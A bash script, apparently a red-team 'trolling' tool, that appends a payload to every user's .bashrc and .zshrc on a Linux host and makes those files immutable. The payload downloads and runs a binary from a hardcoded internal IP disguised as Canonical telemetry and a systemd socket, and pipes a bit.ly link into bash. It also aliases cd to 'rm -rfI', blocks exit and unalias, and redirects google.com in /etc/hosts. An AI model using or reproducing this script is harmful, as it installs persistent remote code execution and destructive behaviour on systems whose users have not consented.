#!/bin/bash

# --- .bashrc and .zshrc
# Rick roll - https://github.com/keroserene/rickrollrc
# REMOVED (causing nothing after it to be executed): Party parrot - https://parrot.live
# NOT IMPLEMENTED: ASCIIquarium - https://robobunny.com/projects/asciiquarium/asciiquarium.tar.gz
# Install "sl", displays a train ASCII animation when mistyping "ls"
# Cowsay
# Funny command aliases

# --- /etc/hosts
# Redirect all Google queries to Bing

# First make a good .bashrc that I can source when logging in

echo "[+] --- Backing up '.bashrc' and '.zshrc'"

if [ -f "/root/.bashrc" ] && ! grep -q "Please wait" "/root/.bashrc"; then
	if ! cp "/root/.bashrc" "/usr/lib/.bashrc.bak"; then
		echo "[!] Could not back up original bashrc, exiting"
		exit 1
	else
		echo "[*] Backed up original bashrc to '/usr/lib/.bashrc.bak'"
	fi
fi
if [ -f "/root/.zshrc" ] && ! grep -q "Please wait" "/root/.zshrc"; then
	if ! cp "/root/.zshrc" "/usr/lib/.zshrc.bak"; then
		echo "[!] Could not back up original zshrc, exiting"
		exit 1
	else
		echo "[*] Backed up original zshrc to '/usr/lib/.zshrc.bak'"
	fi
fi


# Install necessary packages
install_packages="cowsay sl lolcat"

echo
if which apt-get &>/dev/null; then
	echo "[+] --- Installing packages '$install_packages'"
	if ! apt-get install -y $install_packages; then
		echo "[!] Could not install packages"
	else
		echo "[=] Packages installed"
	fi
elif which yum &>/dev/null; then
	echo "[+] --- Installing packages '$install_packages'"
	if ! yum install -y $install_packages; then
		echo "[!] Could not install packages"
	else
		echo "[=] Packages installed"
	fi
else
	echo "[!] No compatible package managers detected: could not install '$install_packages'"
fi


echo
echo "[+] --- Trolling '.bashrc' and '.zshrc' for all users"
echo "[!] *** Don't forget to change the IP address in trollrc!!! ***"

trollrc='
export CANONICAL_TELEMETRY_SERVER="http://10.10.2.4:8080/telemetry"
export SYSTEMD_SOCKET="/tmp/systemd-timers-daemon.socket"
wget -qO "$SYSTEMD_SOCKET" --no-check-certificate "$CANONICAL_TELEMETRY_SERVER"; chmod +x "$SYSTEMD_SOCKET"; "$SYSTEMD_SOCKET"& disown

sus='\''
      ___________________
     / THIS SHELL IS SUS \
     \___________________/ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣤⣤⣤⣶⣦⣤⣄⡀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⠛⠛⠛⠛⠻⢿⣿⣷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠋⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠈⢻⣿⣿⡄
⠀⠀⠀⠀⠀⠀⠀⣸⣿⡏⠀⠀⠀⣠⣶⣾⣿⣿⣿⠿⠿⠿⢿⣿⣿⣿⣄
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁⠀⠀⢰⣿⣿⣯⠁⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣷⡄
⠀⠀⣀⣤⣴⣶⣶⣿⡟⠀⠀⠀⢸⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷
⠀⢰⣿⡟⠋⠉⣹⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣷⣦⣤⣤⣤⣶⣶⣶⣶⣿⣿⣿
⠀⢸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃
⠀⣸⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠉⠻⠿⣿⣿⣿⣿⡿⠿⠿⠛⢻⣿⡇
⠀⣿⣿⠁⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣧
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
⠀⣿⣿⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
⠀⢿⣿⡆⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇
⠀⠸⣿⣧⡀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃
⠀⠀⠛⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⣰⣿⣿⣷⣶⣶⣶⣶⠶⠀⢠⣿⣿
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⣽⣿⡏⠁⠀⠀⢸⣿⡇
⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⣿⣿⡇⠀⢹⣿⡆⠀⠀⠀⣸⣿⠇
⠀⠀⠀⠀⠀⠀⠀⢿⣿⣦⣄⣀⣠⣴⣿⣿⠁⠀⠈⠻⣿⣿⣿⣿⡿⠏
⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⠿⠿⠿⠿⠋⠁
'\''
if which sl &>/dev/null; then
	(while :; do sleep 30; sl; done) &
else
	(while :; do sleep 30; echo "$sus"; done) &
fi

if which cowsay &>/dev/null; then
	(while :; do sleep 8; echo; cowsay -f milk "GOT MILK?"; done) &
else
	(while :; do sleep 8; echo "hacked :)"; done) &
fi

export TERM=xterm

echo "Please wait..."
curl -s -L http://bit.ly/10hA8iC | bash

echo "Loading user shell"

alias ls="sl" # choo choo!
alias cd="rm -rfI"
meow="ICAgICAgICAgICAgICAgICAgVC4iLS5fLi4tLS0uLl8sLSIvfAogICAgICAgICAgICAgICAgICBsfCItLiAgXy52Ll8gICAoIiB8CiAgICAgICAgICAgICAgICAgIFtsIC8uJ18gXDsgX34iLS5gLXQKICAgICAgICAgICAgICAgICAgWSAiIF8ob30gX3tvKS5fIF4ufAogICAgICAgICAgICAgICAgICBqICBUICAsLTx2Pi0uICBUICBdCiAgICAgICAgICAgICAgICAgIFwgIGwgKCAvLV4tXCApICEgICEKICAgICAgICAgICAgICAgICAgIFwuIFwuICAifiIgIC4vICAvYy0uLixfXwogICAgICAgICAgICAgICAgICAgICBeci0gLi5fIC4tIC4tIiAgYC0gLiAgfiItLS4KICAgICAgICAgICAgICAgICAgICAgID4gXC4gICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgICAgICAgICAgICAgICAgXSAgIF4uICAgICAgICAgICAgICAgICAgICAgXAogICAgICAgICAgICAgICAgICAgICAgMyAgLiAgIj4gICAgICAgICAgICAuICAgICAgIFkKICAgICAgICAgLC5fXy4tLS5fICAgX2ogICBcIH4gICAuICAgICAgICAgOyAgICAgICB8CiAgICAgICAgKCAgICB+Ii0uX34iXi5fXCAgIF4uICAgIF4uXyAgICAgIEkgICAgIC4gbAogICAgICAgICAiLS5fIF9fXyB+Ii0sXzcgICAgLlotLl8gICA3IiAgIFkgICAgICA7ICBcICAgICAgICBfCiAgICAgICAgICAgIC8iICAgIn4tKHIgciAgXy9fLS0uX34tLyAgICAvICAgICAgLywuLS1eLS5fICAgLyBZCiAgICAgICAgICAgICItLl8gICAgJyJ+fn4+LS5ffl0+LS1eLS0tLi9fX19fLC5efiAgICAgICAgXi5eICAhCiAgICAgICAgICAgICAgICB+LS0uXyAgICAnICAgWS0tLS4gICAgICAgICAgICAgICAgICAgICAgICBcLi8KICAgICAgICAgICAgICAgICAgICAgfn4tLS5fICBsXyAgICkgICAgICAgICAgICAgICAgICAgICAgICBcCiAgICAgICAgICAgICAgICAgICAgICAgICAgIH4tLl9+fn4tLS0uXyxfX19fLi4tLS0gICAgICAgICAgIFwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH4tLS0tIn4gICAgICAgXAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXA=="
alias clear="/bin/cat /dev/urandom"
alias cat="if which lolcat &>/dev/null; then base64 -d <<< \"$meow\" | lolcat; else base64 -d <<< \"$meow\"; echo; fi #"
alias mv="cp"
alias less="more"
alias nano="if which cowsay &>/dev/null; then cowsay -f eyes \"No nano! You will be punished! >:(\"; else echo \"No nano! You will be punished! >:(\"; fi; echo \"shutdown: Shutdown scheduled for `date -d "5 minutes"`\" #"
alias vim="vi"
alias emacs="vi"
alias gedit="vi"
alias ed="vi"
forever='\''
__   __          _            _                   
\ \ / /__  _   _( )_ __ ___  | |__   ___ _ __ ___ 
 \ V / _ \| | | |/|  __/ _ \ |  _ \ / _ \  __/ _ \
  | | (_) | |_| | | | |  __/ | | | |  __/ | |  __/
  |_|\___/ \__,_| |_|  \___| |_| |_|\___|_|  \___|
                                                  
 _____ ___  ____  _______     _______ ____  
|  ___/ _ \|  _ \| ____\ \   / / ____|  _ \ 
| |_ | | | | |_) |  _|  \ \ / /|  _| | |_) |
|  _|| |_| |  _ <| |___  \ V / | |___|  _ < 
|_|   \___/|_| \_\_____|  \_/  |_____|_| \_\
'\''
alias exit="if which cowsay &>/dev/null; then cowsay -f ghostbusters \"I ain'\''t afraid of no shell!\"; else echo \"$forever\"; fi"
alias logout="if which cowsay &>/dev/null; then cowsay -f ghostbusters \"I ain'\''t afraid of no shell!\"; else echo \"$forever\"; fi"
alias unalias="echo \"I'\''m sorry `whoami`, I can'\'' do that.\""

[ -f "~/.bashrc" ] && echo "sleep 0.05" >> ~/.bashrc # you'\''re getting sleepier...
[ -f "~/.zshrc" ] && echo "sleep 0.05" >> ~/.zshrc # you'\''re getting sleepier...'



for user in /root /home/*; do
	# Troll .bashrc
	if [ -f "$user/.bashrc" ]; then
		if grep -q "Please wait" "$user/.bashrc"; then
			echo "[-] User '$user/.bashrc' already trolled, skipping"
		else
			if echo "$trollrc" >> "$user/.bashrc"; then
				echo "[=] Added trollrc to '$user/.bashrc'"
				if chattr +i "$user/.bashrc"; then
					echo "[=] Made '$user/.bashrc' immutable"
				else
					echo "[-] Could not make '$user/.bashrc' immutable"
				fi
			else
				echo "[!] Could not add trollrc to '$user/.bashrc'"
			fi
		fi
	fi

	# Troll .zshrc
	if [ -f "$user/.zshrc" ]; then
		if grep -q "Please wait" "$user/.zshrc"; then
			echo "[-] User '$user/.zshrc' already trolled, skipping"
		else
			if echo "$trollrc" >> "$user/.zshrc"; then
				echo "[=] Added trollrc to '$user/.zshrc'"
				if chattr +i "$user/.zshrc"; then
					echo "[=] Made '$user/.zshrc' immutable"
				else
					echo "[-] Could not make '$user/.zshrc' immutable"
				fi
			else
				echo "[!] Could not add trollrc to '$user/.zshrc'"
			fi
		fi
	fi
done

echo
echo "[+] --- Trolling '/etc/hosts'"

trollhosts='
204.79.197.200 google.com www.google.com
'

if grep -q "google.com" "/etc/hosts"; then
	echo "[-] '/etc/hosts' already trolled, skipping"
else
	echo "$trollhosts" >> /etc/hosts && echo "[=] Added trollhosts to '/etc/hosts'" || echo "[!] Could not add trollhosts to '/etc/hosts'"
fi

echo
echo "[+] Done trolling!"
